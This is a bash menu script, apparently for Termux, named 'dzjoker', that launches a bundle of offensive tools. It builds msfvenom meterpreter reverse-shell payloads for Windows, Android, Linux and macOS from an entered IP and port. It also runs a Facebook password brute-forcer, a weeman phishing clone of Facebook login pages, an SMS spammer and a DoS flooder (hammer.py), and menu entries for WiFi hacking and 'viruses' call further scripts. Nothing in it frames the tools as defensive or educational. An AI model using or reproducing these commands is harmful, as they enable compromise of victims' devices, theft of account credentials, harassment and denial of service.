clear
#colors
w='\e[97m'
g='\033[1;92m'
r='\033[1;91m'
a='\033[1;94m'
b='\e[1;4m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
G='\e[110m'
G1='\e[101m'
o='\033[0m'
n=install
cd $HOME/dzjoker
clear
echo -e $red' ▄▄▄██▀▀▀▒█████   ▒█████   ██ ▄█▀▓█████  ██▀███ '
sleep 0.2
echo -e $blue'   ▒██  ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒ '
sleep 0.2
echo -e $purple'   ░██  ▒██░  ██▒▒██░  ██▒▓███▄░ ▒███   ▓██ ░▄█ ▒ '
sleep 0.2
echo -e $cyan'▓██▄██▓ ▒██   ██░▒██   ██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄ '
sleep 0.2
echo -e $green' ▓███▒ ░ ████▓▒░░ ████▓▒░▒██▒ █▄░▒████▒░██▓ ▒██▒ '
sleep 0.4
echo -e $red' ▒▓▒▒░  ░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░ '
sleep 0.3
echo ' ▒ ░▒░    ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░ '
sleep 0.3
echo ' ░ ░ ░  ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░    ░     ░░   ░ '
sleep 0.2
echo ' ░   ░      ░ ░      ░ ░  ░  ░      ░  ░   ░ '

echo -e "$G1$w>>>>>>>>>>>>>>>>: INSTAll TOOLS :<<<<<<<<<<<<<<<<<$o"
echo -e ""$red"[$reset"01"$red]$green S TERMUX"$red"    [$reset"02"$red]$green FACEBOOK"$cyan"   $red[$reset"03"$red]$green INFORMATION"
sleep 0.1
echo -e $red"[$reset"04"$red]$green MSF_meta" $red"   [$reset"05"$red]$green WiFi HACK"$red"  [$reset"06"$red]$green PAttacks"
sleep 0.1
echo -e "$G1$w>>>>>>>>>>>>>>>>>>>: HACKING :<<<<<<<<<<<<<<<<<<<<$o"
sleep 0.1
echo -e ""$red"[$reset"07"$red]$green FACE HK"   $red"    [$reset"08"$red]$green NmapScan" $red"  [$reset"09"$red]$green Payload"
sleep 0.1
echo -e  $red"[$reset"10"$red]$green Ngrok"$red"       [$reset"11"$red]$green ViRuSs" $red"    [$reset"12"$red]$green DOS AttaCk"
sleep 0.1
python .m.py
echo -e "$green"
read -p "PLEASE>>>ENTER>>>NUMBER>>>:~# " ali
st(){
cd /$HOME/dzjoker/.ster/
chmod +x *
./ster.sh
}
if [ "$ali" -eq "1" ]; then
         st
fi
####facebook
fc(){
cd /$HOME/dzjoker/.fc/
chmod +x .fc.sh
./.fc.sh
}
if [ "$ali" -eq "2" ]; then
         fc
fi
##########informa
inf(){
cd /$HOME/dzjoker/.inf/
chmod +x .inf.sh
./.inf.sh

}
if [ "$ali" -eq "3" ]; then
            inf
fi
##########meta
meta(){
cd /$HOME/dzjoker/.meta/
chmod +x .meta.sh
./.meta.sh
}

if [ "$ali" -eq "4" ]; then
            meta
fi
######()///#--_56
wi(){

cd /$HOME/dzjoker/.wifi/
chmod +x *
./wifi.sh

}

if [ "$ali" -eq "5" ]; then
            wi
fi
#######
pa(){
cd /$HOME/dzjoker/.dos/
chmod +x .dos.sh
./.dos.sh
}

if [ "$ali" -eq "6" ]; then
            pa
fi
###
HK(){
clear
echo -e "$red"
figlet -f big "HK.FACE"
echo -e $red"["$w"1"$red"]"$w "HACK FACE"
sleep 0.1
echo -e $red"["$w"2"$red"]"$w "HACK URL"
sleep 0.1
echo -e $red"["$w"3"$red"]"$w "HACK PASS"
sleep 0.1
echo -e $red"["$w"00"$red"]"$red "ExIT"
sleep 0.1
echo -e $red"["$w"99"$red"]"$cyan "BaCk"
echo ""
echo -e "$red"
read -p "Please Enter NumBeR}}}>>:~# " hk

}
if [ "$ali" -eq "07" ]; then
   HK
fi
if [ "$hk" -eq "99" ]; then
./joker.sh
fi
if [ "$hk" -eq "00" ]; then
clear
exit
fi
if [ "$hk" -eq "1" ]; then
cd /$HOME/dzjoker
python2 .op.py
fi
##########
update(){
echo -e "$blue"
figlet  -f big "U P D ATE" 
sleep 1
figlet  -f big "....Now"
sleep 1
clear
figlet  -f big "U P D ATE"
sleep 1
cd
cd $HOME/dzjoker
chmod +x *
./.setup.sh
}

if [ "$ali" -eq "55"  ]; then
        update
fi
#################
################
hack(){
clear
echo -e "$cyan"
figlet  -f big "WElCOME"
sleep 0.9
clear
toilet -f mono12 -F gay "..IN"
sleep 0.5
clear
toilet -f mono12 -F gay "PaylD"
sleep 0.3
clear
echo -e $red'  ██████╗ ███████╗██╗  ██╗ █████╗  ██████╗██╗  ██╗ '
sleep 0.1
echo -e $green'  ██╔══██╗╚══███╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝ '
sleep 0.1
echo  -e $cyan'  ██║  ██║  ███╔╝ ███████║███████║██║     █████╔╝ '
sleep 0.1
echo -e $reset'  ██║  ██║ ███╔╝  ██╔══██║██╔══██║██║     ██╔═██╗ '
sleep 0.1
echo -e $blue'  ██████╔╝███████╗██║  ██║██║  ██║╚██████╗██║  ██╗'
sleep 0.1
echo '  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝'
echo -e "$green"
echo -e "{My IP}~~~>>>>>>>>>>>Đž_JøØKěŘ<<<<<<<<<<~~~{My IP}"
       curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
echo -e  $red"["$green"1"$red"]"$purple "PayloaD windows"$red"        ["$green"2"$red"]"$purple "PayloaD Android"
sleep 0.1
echo -e  $red"["$green"3"$red"]"$purple "PayloaD LINUX  "$red"        ["$green"4"$red"]"$purple "PayloaD Mac OS" 
sleep 0.1
echo -e $red"["$green"5"$red"]"$purple "SeNT SMS"
sleep 0.1
echo -e $red"["$cyan"J"$green"o"$red"O"$reset"K"$blue"E"$purple"R"$red"]"$cyan">"$green">"$yellow">"$cyan">"$green">"$purple">"$reset">"$cyan">"$blue">"$green">"$purple">"$red"["$w"00"$red"]"$red "Exit" $cyan">"$green">"$yellow">"$cyan">"$green">"$purple">"$reset">"$cyan">"$blue">"$cyan">"$green">"$purple">"$red"["$green"99"$red"]"$cyan "BaCk"
sleep 0.1
echo -e "$gree"
read -p "Please Enter NuMbER:~# " joker

}

if [ "$ali" -eq "9"  ]; then
        hack
fi
if [ "$joker" -eq "00"  ]; then
clear
exit
fi
####################################
################
##############
face(){
clear
toilet -f mono12 -F gay "FACE"
sleep 1
cd
termux-open https://www.facebook.com/Alsantaresehhhhhhhhhhhhh
clear
echo -e "$yellow"
figlet  -f big "Dz JoOkeR"
echo "Please Enter Back<<<"
read back

$back clear
cd /$HOME/dzjoker
./joker.sh

}

if [ "$ali" -eq "99"  ]; then
        face
fi
##############
youtube(){
clear
echo -e "$red"
figlet  -f big " YOuTuBe"
sleep 1
cd
termux-open https://www.youtube.com/channel/UCqxMlxWaFTGypJq6nU7mGjA
clear
echo -e "$yellow"
figlet  -f big "Dz JoOkeR" 
echo "Please Enter Back<<<"
read back

$back clear
cd /$HOME/dzjoker
./joker.sh

}

if [ "$ali" -eq "88"  ]; then
        youtube
fi
##############

##########6#################
back(){
clear
echo -e "$cyan"
figlet -f big " B a C k"
echo "Please Enter Back To Dz JokeR<<<"
read back
$back clear
cd /$HOME/dzjoker
./joker.sh

}

if [ "$joker" -eq "99" ]; then
           back
fi
########878::8:8::8;77;(;(#__(;##
ex(){
clear
figlet -f big "TheEnND"
echo "Please Enter Exit <<<Goodbay>>>>"
read exit
$exit clear
clear
exit
clear
}
if [ "$ali" -eq "00" ]; then
           ex
fi
###722(;;(;;(;((;)8338;((!;';/;;/;/;/;/;;/;;/;
payw(){
clear
echo "$green"
figlet -f big "PaYloadW"
echo -e "$purple"
read -p "     Please Enter Your IP>>>>>> " ipp
sleep 2
read -p "    Please Enter Your PORT>>>>>>> " pp
sleep 2
read -p " Please Enter Name payload>>>>>>> " nn

cd
cd metasploit-framework

./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  /sdcard/dzjoker/$nn.exe
echo -e "$cyan Path of the pyload-----> $yellow  /sdcard/dzjoker/$nn.exe"
echo -e "$purple end the payload+++++++++++++++++++++ "
sleep 2
cd $HOME/dzjoker
read -p "Please Enter To Back :~#You Go To sdcars/dzjoker"

cd /$HOME/dzjoker
./joker.sh
}
if [ "$joker" -eq "1" ]; then
           payw
fi
#)#);;);;);;(;(;((;/;;/;;//;/;///;;)
linux(){
clear
echo "$blue"
figlet -f big "PaYloadL"
echo -e "$red"
read -p "Please Enter Your IP>>>> " uu
sleep 2
read -p "   Please Enter Your PORT>>>>> " tt
sleep 2
read -p "     Please Enter Name Payload>>>>>> " mm
cd
cd metasploit-framework
./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uu LPORT=$tt -f elf > /sdcard/dzjoker/$mm.elf
clear
echo -e "$cyan Path of the pyload--->$yellow  /sdcard/dzjoker/$n.elf"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd /$HOME/dzjoker
read -p "Please Enter To BaCk You Go sdcard/dzjoker"
./joker.sh
}
if [ "$joker" -eq "3" ]; then
           linux
fi
############66666
paym(){
clear
echo "$blue"
figlet -f big "PaYloadM"
echo -e "$cyan"
read -p "Please Enter Your IP>>>> " cc
sleep 1
read -p "    Please Enter Your PORT>>>>> " zz
sleep 1
read -p "      Please Enter Name Payload>>>>>>> " xx

cd
cd metasploit-framework
./msfvenom -p osx/x86/shell_reverse_tcp LHOST=$cc LPORT=$zz -f macho > /sdcard/dzjoker/$xx.macho
clear
echo -e "$cyan Path of the pyload----->  $yellow  /sdcard/dzjoker/$n.macho"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd $HOME/dzjoker
read -p "Please Enter To BaCk You Go sdcard/dzjoker"

./joker.sh
}
if [ "$joker" -eq "4" ]; then
           paym
fi
#########6
paya(){
clear
echo "green"
figlet -f big "PaYloadA"

echo -e "$cyan"
read -p "Please Enter Your IP>>>>>> " ip
sleep 2
read -p "    Please Enter Your PORT>>>>>>> " p
sleep 2
read -p "      Please Enter Name Payload>>>>>>>>>> " n

cd
cd metasploit-framework

./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  /sdcard/dzjoker/$n.apk
clear
echo -e "$cyan Path of the pyload----->  $yellow  /sdcard/dzjoker/$n.apk"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd $HOME/dzjoker
read -p "Please Enter To BaCk You Go sdcard/dzjoker"

./joker.sh
}
if [ "$joker" -eq "2" ]; then
           paya
fi
#################
book1(){
echo "green"
figlet -f big "HaCk FaCe1" 
echo -e "  $red         [1]add password        [0]back"
echo ""
echo -e " $green      id = E-mail "
echo "               password = password.txt "
read -p "            entat   " face
if [ "$face" -eq "1"  ]; then
nano $HOME/dzjoker/.facebook/password.txt
./joker.sh
elif [ "$face" -eq "0" ]; then
./joker.sh
else
pkg $n python2
pip2 install mechanize
clear
sh $HOME/dzjoker/.cxcxcx.sh
echo -e " $yellow                 password = password.txt"
echo -e "$green"
cd $HOME/dzjoker/.facebook
python2 $HOME/dzjoker/.facebook/facebook.py
sleep 1000000
$back clear
cd /$HOME/dzjoker
./joker.sh

fi

}

if [ "$hk" -eq "3" ]; then
           book1
fi
#############
face2(){
echo "green"
figlet -f big "HaCk URL" 
cd
rm $HOME/dzjoker/.weeman/core/shell.py
rm $HOME/dzjoker/.weeman/core/shell.pyc
cd $HOME/dzjoker
clear
chmod +x .bvbv.sh
sh .bvbv.sh
echo -e "$green"
echo -e "=================>{$blue facebook$green }<==============="
echo -e "$cyan                    set url "
echo -e "$cyan                 set action_url "
read -p "    entar " max

if [ "$max" -eq "0"  ]; then
./joker.sh
else
cp $HOME/dzjoker/.max/shellf.py $HOME/dzjoker/.weeman/core/shell.py
cd $HOME/dzjoker/.weeman/
python2 weeman.py
$back clear
cd /$HOME/dzjoker
./joker.sh

fi

}

if [ "$hk" -eq "2" ]; then
           face2
fi
#####((((((((
ssms(){
pkg $n python2
clear
toilet -f mono12 -F gay "SENTt"
cd $HOME/dzjoker/.Spammer-Grab
echo -e "$cyan"
read -p "PleaSe>>>Enter>>>NuMbeR>>> " f
python2 spammer.py --delay 30 $f
cd ..
./joker.sh
}

if [ "$joker" -eq "5" ]; then
           ssms
fi
############6666666
sg(){
echo "green"
figlet -f big "SENT GmaiL" 

$back clear
cd /$HOME/dzjoker
./joker.sh
}
if [ "$joker" -eq "6" ]; then
           sg
fi
##########77777777

##(########888888
Dos(){
echo "$green"
figlet -f big "DoSAttaCk" 
read -p "    {IP}<~>{LINK}>>>>" ip
read -p "    {PORT}<~>{80}>>>>>>" pr
read -p "    {Time in seconds}>>>>>" ti
pkg $n python
clear
echo -e "$green"
cd .hammer
chmod +x hammer.py
python hammer.py -s $ip -p $pr -t $ti
$back clear
cd /$HOME/dzjoker
./joker.sh
}
if [ "$ali" -eq "12" ]; then
           Dos
fi
################999999999

########(((((111100000

################1111111111111111111111

###############11112222

#--------------------------------------------------
#--------------------------------------------------

if [ "$ali" -eq "00" ]; then
clear
exit
fi
#######
vir(){
cd /$HOME/dzjoker/.viros/
chmod +x .vir.sh
./.vir.sh
}

if [ "$ali" -eq "11" ]; then
            vir
fi
###
##########
ng(){
cd /$HOME/dzjoker/.ngrok/
chmod +x ng.sh
./ng.sh
}

if [ "$ali" -eq "10" ]; then
            ng
fi
#############
nm(){
cd /$HOME/dzjoker/.nm/
chmod +x nm.sh
./nm.sh
}

if [ "$ali" -eq "8" ]; then
            nm
fi
